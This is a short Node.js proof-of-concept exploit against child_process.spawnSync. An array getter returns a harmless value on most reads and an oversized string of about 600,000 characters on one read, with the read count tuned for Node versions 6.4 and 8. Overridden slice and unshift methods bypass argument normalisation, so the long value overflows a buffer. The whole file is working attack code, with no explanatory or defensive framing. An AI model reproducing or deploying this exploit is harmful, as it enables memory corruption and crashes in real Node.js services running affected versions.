const spawn = require('child_process').spawnSync;
let counter = 0;
// mess with args
const args = [ 'ls', '-a' ];

Object.defineProperty(args, 2, {
  get: () => { 
    if (counter++ === 2) { // set this to 3 for v6.4, 2 for 8
      // compute giant string to overlow
      let str = 'pwn0';
      for (let i =0 ;i <100024; i++) {
        str+='pwnpwn'
      }
      return str;
    } else {
      return 'pwn0';
    }
  },
  enumerable: true
});

args.slice = () => { // so normalizing args does nothing
  return args;
};
args.unshift = (file) => {
  // need this so the unshift in child_process doesn't throw
};

spawn('ls', args);
